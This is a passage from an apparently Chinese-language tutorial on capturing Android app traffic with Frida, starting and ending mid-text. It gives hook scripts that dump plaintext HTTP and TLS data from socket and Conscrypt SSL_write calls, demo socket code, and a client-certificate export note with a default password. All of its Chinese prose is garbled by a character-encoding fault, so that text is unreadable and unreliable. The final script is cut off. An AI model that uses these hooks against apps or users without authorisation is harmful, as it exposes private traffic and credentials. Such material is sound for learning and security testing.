</p><ul><li>å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡ºåŠŸèƒ½ï¼šé»˜è®¤å¼€å¯ï¼›å¿…é¡»ä»¥Spawmæ¨¡å¼è¿è¡Œï¼›</li></ul><blockquote><p>è¿è¡Œè„šæœ¬ä¹‹å‰å¿…é¡»æ‰‹åŠ¨ç»™AppåŠ ä¸Šå­˜å‚¨å¡è¯»å†™æƒé™ï¼›</p></blockquote><blockquote><p>å¹¶ä¸æ˜¯æ‰€æœ‰Appéƒ½éƒ¨ç½²äº†æœåŠ¡å™¨éªŒè¯å®¢æˆ·ç«¯çš„æœºåˆ¶ï¼Œåªæœ‰é…ç½®äº†çš„æ‰ä¼šåœ¨Apkä¸­åŒ…å«å®¢æˆ·ç«¯è¯ä¹¦</p></blockquote><blockquote><p>å¯¼å‡ºåçš„è¯ä¹¦ä½äº&#x2F;sdcard&#x2F;Download&#x2F;åŒ…åxxx.p12è·¯å¾„ï¼Œå¯¼å‡ºå¤šæ¬¡ï¼Œæ¯ä¸€ä»½å‡å¯ç”¨ï¼Œå¯†ç é»˜è®¤ä¸ºï¼šr0ysueï¼Œæ¨èä½¿ç”¨<a href="http://keystore-explorer.org/">keystore-explorer</a>æ‰“å¼€æŸ¥çœ‹è¯ä¹¦ã€‚</p></blockquote><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281000553.png" alt="image-20240628100019436"> </p><h2 id="4-çŸ¥è¯†ç‚¹æ±‡æ€»"><a href="#4-çŸ¥è¯†ç‚¹æ±‡æ€»" class="headerlink" title="4. çŸ¥è¯†ç‚¹æ±‡æ€»"></a>4. çŸ¥è¯†ç‚¹æ±‡æ€»</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281001177.png" alt="image-20240628100124057"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281003808.png" alt="å¾®ä¿¡å›¾ç‰‡_20240628100321"> </p><h1 id="äºŒ-HookåŸç†-å…³é”®æºç è¿½è¸ª"><a href="#äºŒ-HookåŸç†-å…³é”®æºç è¿½è¸ª" class="headerlink" title="äºŒ HookåŸç†&amp;å…³é”®æºç è¿½è¸ª"></a>äºŒ HookåŸç†&amp;å…³é”®æºç è¿½è¸ª</h1><h2 id="1-HTTP-Request"><a href="#1-HTTP-Request" class="headerlink" title="1. HTTP Request"></a>1. HTTP Request</h2><h3 id="å®ç°httpè¯·æ±‚"><a href="#å®ç°httpè¯·æ±‚" class="headerlink" title="å®ç°httpè¯·æ±‚"></a>å®ç°httpè¯·æ±‚</h3><p>åˆ›å»ºä¸€ä¸ªhttpsockå‡½æ•°ï¼Œæœ¬è´¨å°±æ˜¯ç®€å•çš„javaä»£ç ï¼Œé€šè¿‡socketå®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http://www.dtasecurity.cn:18080/demo01/getNotice</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpsock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;www.dtasecurity.cn&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">18080</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/demo01/getNotice&quot;</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);  <span class="comment">//åˆ›å»ºsocketå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.toString());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();   <span class="comment">//å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ‹¼æ¥å¥½ä¹‹åè°ƒç”¨socketå‘é€åˆ°æœåŠ¡ç«¯</span></span><br><span class="line">        outputStream.write(sb.toString().getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™å—åŒä¸Šï¼Œæ¥æ”¶æœåŠ¡ç«¯çš„è¿”å›æ•°æ®</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.read(buffer,<span class="number">0</span>,buffer.length) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(Arrays.copyOf(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281010710.png" alt="image.png"> </p><p>å¯ä»¥çœ‹åˆ°è¿™å—Javaä»£ç æ˜¯è°ƒç”¨äº† outputStream çš„ write æ–¹æ³•ï¼Œå®ç°å°†æ•°æ®ä¼ é€åˆ°ç®¡é“ä¸­çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281010312.png" alt="image.png"> </p><p>è·Ÿè¿›writeæ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨byteæ•°ç»„ï¼Œè¿›è¡Œæ•°æ®å†™å…¥ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281013204.png" alt="image.png"> </p><p>è¿™å— outputStream æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼ŒæŠ½è±¡ç±»æ˜¯ä¸èƒ½ç›´æ¥hookçš„ï¼Œæ‰€ä»¥è¿™å—éœ€è¦æ‰¾åˆ°  outputStream çš„å®ç°ç±»ã€‚ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•æ‰¾åˆ°å®ƒçš„å®ç°ç±»å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™å—å¯ä»¥åœ¨ outputStream.write å¤„ä¸‹æ–­ç‚¹ï¼Œdebugè°ƒè¯•æ‰¾åˆ°å®ƒçš„å…·ä½“å®ç°ç±»ä¸ºï¼š<strong>SocketOutputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281014811.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œè¿™å—å¯ä»¥æŸ¥æ‰¾ä¸‹  <strong>SocketOutputStream</strong> ä¸­çš„writeæ–¹æ³•ï¼Œå‚æ•°ç±»å‹ä¸ºbyte</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015623.png" alt="image.png"> </p><p>è°ƒç”¨äº† socketWrite æ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹è·Ÿã€‚å¯ä»¥çœ‹åˆ°çœŸæ­£è°ƒç”¨çš„æ˜¯tryä¸­åŒ…è£¹çš„<strong>socketWrite0</strong>æ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015859.png" alt="image.png"> </p><p>è·Ÿè¿›socketWrite0 æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™å—ä¿®é¥°ç¬¦å¤šäº†ä¸ª <strong>native</strong>ï¼Œè¿™æ˜¯å› ä¸ºå‡½æ•°ä¸æ˜¯åœ¨javaå±‚å®ç°çš„ï¼Œå®ƒçš„å®ç°åœ¨soå±‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281015354.png" alt="image.png"> </p><h3 id="Frida-Hook-Http-request"><a href="#Frida-Hook-Http-request" class="headerlink" title="Frida Hook Http-request"></a>Frida Hook Http-request</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start!&quot;</span>) </span><br><span class="line">        <span class="comment">//hook SocketOutputStreamä¸­çš„socketWrite0å‡½æ•°</span></span><br><span class="line">        <span class="comment">//è¿™å—çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°å‡½æ•°ä¸­çš„å‚æ•° bytes</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="comment">//æ‰“å°äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åœ°å€</span></span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(localAddress +<span class="string">&quot;====&gt;&quot;</span>+ remoteAddress)</span><br><span class="line">           </span><br><span class="line">            <span class="comment">//è¿™å—é€šè¿‡è‡ªå®šä¹‰hexdumpå‡½æ•°ï¼Œè·å–è¾“å…¥çš„byteå†…å®¹</span></span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len)</span><br><span class="line">        </span><br><span class="line">            <span class="title function_">showStacks</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥å®ç°å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">            <span class="comment">// offset =&gt; I</span></span><br><span class="line">            <span class="comment">// length =&gt; I</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281019142.png" alt="image.png"> </p><h2 id="2-HTTP-Response"><a href="#2-HTTP-Response" class="headerlink" title="2. HTTP Response"></a>2. HTTP Response</h2><p>è¿™å—æ˜¯è°ƒç”¨inputStream.readæ–¹æ³•æ¥è·å–httpçš„responseçš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024346.png" alt="image.png"> </p><p>inputStream.readå’Œ outputStream.writeæ–¹æ³•æ˜¯å¯¹åº”å…³ç³»ï¼Œè¿™å—å¯ä»¥å¤§èƒ†çŒœæµ‹ä¸€ä¸‹ï¼ŒinputStreamçš„å®ç°ç±»æ˜¯<strong>SocketIntputStream</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024982.png" alt="image.png"> </p><p>åœ¨å®ƒçš„é‡Œé¢ï¼Œä¹Ÿæ˜¯æœ‰<strong>socketRead0</strong>æ–¹æ³•çš„ï¼Œæˆ‘ä»¬è¿™å—hookï¼Œä¹Ÿæ˜¯hookçš„è¿™ä¸ªæ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281024116.png" alt="image.png"> </p><h3 id="Frida-Hook-Http-response"><a href="#Frida-Hook-Http-response" class="headerlink" title="Frida Hook Http-response"></a>Frida Hook Http-response</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//http response</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len,timeout</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Intercepted socket read&quot;</span>);                              </span><br><span class="line">        <span class="comment">//æ‰“å°äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åœ°å€</span></span><br><span class="line">        <span class="keyword">var</span> localAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">var</span> remoteAddress = <span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(remoteAddress +<span class="string">&quot;&lt;====&quot;</span>+ localAddress)</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°äº†è¯»å–çš„æ•°æ®</span></span><br><span class="line">        <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">showStacks</span>() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥å®ç°å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281029679.png" alt="image.png"> </p><h2 id="3-HTTPS-Request"><a href="#3-HTTPS-Request" class="headerlink" title="3. HTTPS Request"></a>3. HTTPS Request</h2><h3 id="å®ç°httpsè¯·æ±‚"><a href="#å®ç°httpsè¯·æ±‚" class="headerlink" title="å®ç°httpsè¯·æ±‚"></a>å®ç°httpsè¯·æ±‚</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://www.taobao.com</span></span><br><span class="line">private <span class="keyword">void</span> <span class="title function_">httpsock</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        final <span class="title class_">String</span> host = <span class="string">&quot;www.taobao.com&quot;</span>;</span><br><span class="line">        final int port = <span class="number">18080</span>;</span><br><span class="line">        final <span class="title class_">String</span> path = <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™å—ä½¿ç”¨SSLæ¥ä¼ è¾“æ•°æ®</span></span><br><span class="line">        <span class="title class_">SSLSocketFactory</span> sslSocketFactory = (<span class="title class_">SSLSocketFactory</span>) <span class="title class_">SSLSocketFactory</span>.<span class="title function_">getDefault</span>();</span><br><span class="line">        <span class="title class_">SSLSocket</span> socket = (<span class="title class_">SSLSocket</span>) sslSocketFactory.<span class="title function_">createSocket</span>(host,port);</span><br><span class="line">        <span class="comment">//Socket socket = new Socket(host,port);</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">StringBuilder</span> sb = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.<span class="title function_">append</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="title class_">Log</span>.<span class="title function_">d</span>(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="title class_">OutputStream</span> outputStream = socket.<span class="title function_">getOutputStream</span>();</span><br><span class="line">        outputStream.<span class="title function_">write</span>(sb.<span class="title function_">toString</span>().<span class="title function_">getBytes</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title class_">InputStream</span> inputStream = socket.<span class="title function_">getInputStream</span>();</span><br><span class="line">        byte[] buffer = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        int len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.<span class="title function_">read</span>(buffer,<span class="number">0</span>,buffer.<span class="property">length</span>) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            <span class="title class_">Log</span>.<span class="title function_">d</span>(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="title class_">Arrays</span>.<span class="title function_">copyOf</span>(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="title class_">Exception</span> e)&#123;</span><br><span class="line">        e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281030342.png" alt="image.png"> </p><p>è¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå®ç°äº†httpsçš„socketè¯·æ±‚å’Œè¿”å›ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281031758.png" alt="image.png"> </p><h3 id="æºç è·Ÿè¸ª"><a href="#æºç è·Ÿè¸ª" class="headerlink" title="æºç è·Ÿè¸ª"></a>æºç è·Ÿè¸ª</h3><p>æ ¹æ®demoå¯ä»¥çœ‹åˆ°ï¼Œå¤„ç†åŠ ä¸Šäº†ä¸€å±‚SSLSocketï¼Œå‰©ä¸‹çš„å‘é€å’Œæ¥æ”¶çš„ä»£ç ç›¸è¾ƒäºhttpéƒ½æ˜¯æ²¡æœ‰æ”¹åŠ¨çš„ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™å—requestçš„ä»£ç è¿˜æ˜¯ï¼š  outputStream.write</p><p>è¯¥ä½ç½®æ‰“æ–­ç‚¹ï¼ŒæŸ¥çœ‹ outputStream åœ¨æ­¤å¤„çš„å®ç°ç±»ä¸º ï¼š<strong>ConscryptFileDescriptorSocket$SSLOutputStream</strong>ï¼Œè¿™å—çš„SSLOutputStreamä¸ºå†…éƒ¨ç±»ã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032721.png" alt="image.png"> </p><p>æ£€ç´¢ ConscryptFileDescriptorSocketç±»ï¼Œæ²¡æœ‰æ‰¾åˆ°ã€‚çŒœæµ‹å¯èƒ½æ˜¯ç³»ç»Ÿä¸­çš„æŸä¸ªç±»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032526.png" alt="image.png"> </p><p>å¯ä»¥é€šè¿‡ç½‘é¡µæŸ¥æ‰¾ï¼š <a href="http://aospxref.com/android-8.1.0_r81/">http://aospxref.com/android-8.1.0_r81/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281032948.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033011.png" alt="image.png"> </p><p>è¿™å—ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ä½†æ˜¯æ²¡æœ‰åœ¨SSLOutputStreamè¿™ä¸ªå†…éƒ¨ç±»ä¸­æ‰¾åˆ°ï¼Œè¯´æ˜æ²¡æœ‰å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œé‡å†™ï¼Œæ‰€ä»¥ï¼Œç›´æ¥æŸ¥çœ‹ OutputStreamä¸­çš„writeæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033266.png" alt="image.png"> </p><p>è¿™å—è°ƒç”¨çš„æ˜¯ä¸‰ä¸ªå‚æ•°çš„writeæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯<strong>SSLOutputStream</strong>ä¸­çš„writeæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281033554.png" alt="image.png"> </p><p>è°ƒç”¨äº† ssl.write(Platform.getFileDescriptor(socket), buf, offset, byteCount,writeTimeoutMilliseconds);   ä¼ å…¥äº†5ä¸ªå‚æ•°ã€‚</p><p>è·³è½¬ï¼Œå¯ä»¥çœ‹åˆ°å®é™…æ˜¯è°ƒç”¨äº†<strong>SslWraper</strong>è¿™ä¸ªç±»ä¸­çš„writeæ–¹æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034406.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void write(FileDescriptor fd, byte[] buf, int offset, int len, int timeoutMillis)  throws IOException &#123;</span><br><span class="line">    NativeCrypto.SSL_write(ssl, fd, handshakeCallbacks, buf, offset, len, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034593.png" alt="image.png"> </p><p>è¿™å—æœ€ç»ˆæ˜¯åˆ°äº† NativeCrypto.SSL_write æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯Nativeç±»ä¸­çš„äº†ï¼Œåˆ°æ­¤å°±å¯ä»¥äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281034646.png" alt="image.png"> </p><p>æ€»ç»“ä¸€ä¸‹ï¼Œæ•´ä½“çš„ä¸€ä¸ªoutputStream.writeçš„è°ƒç”¨é“¾ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">outputStream.write--&gt;ConscryptFileDescriptorSocket$SSLOutputStream(å®ç°ç±»)--&gt;SSLOutputStream.write(å†…éƒ¨ç±»)--&gt;SslWraper.write--&gt;NativeCrypto.SSL_write(Nativeå±‚)</span><br></pre></td></tr></table></figure><h3 id="Frida-Hook-Https-request"><a href="#Frida-Hook-Https-request" class="headerlink" title="Frida Hook Https-request"></a>Frida Hook Https-request</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044922.png" alt="image.png"> </p><p>è¿è¡Œåï¼Œå‘ç°æŠ¥é”™ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæç¤ºæ‰¾ä¸åˆ°è¿™ä¸ª â€œorg.conscrypt.NativeCryptoâ€ è¿™ä¸ªç±»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044395.png" alt="image.png"> </p><p>çŒœæµ‹ï¼ŒNativeCryptoè¿™ä¸ªç±»çš„åŒ…åå¯èƒ½æœ‰é—®é¢˜ï¼Œä¸€èˆ¬ç±»åŠ è½½åˆ°å†…å­˜ä¸­åï¼ŒåŒ…åå¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚</p><p>javaæ–‡ä»¶ä¸­NativeCryptoç±»çš„åŒ…åä¸º â€œorg.conscryptâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281044407.png" alt="image.png"> </p><p>è¿™å—å¯ä»¥ä½¿ç”¨objectionï¼ŒæŸ¥çœ‹å†…å­˜ä¸­åŠ è½½çš„ç±»åï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android   hooking search classes NativeCrypto</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281045082.png" alt="image.png"> </p><p>ä¿®æ”¹å…¨ç±»åä¸º â€œcom.android.org.conscrypt.NativeCryptoâ€ï¼ŒæˆåŠŸæ‰“å°å‡ºè¯·æ±‚çš„æ•°æ®å’Œè°ƒç”¨å †æ ˆã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281045251.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, 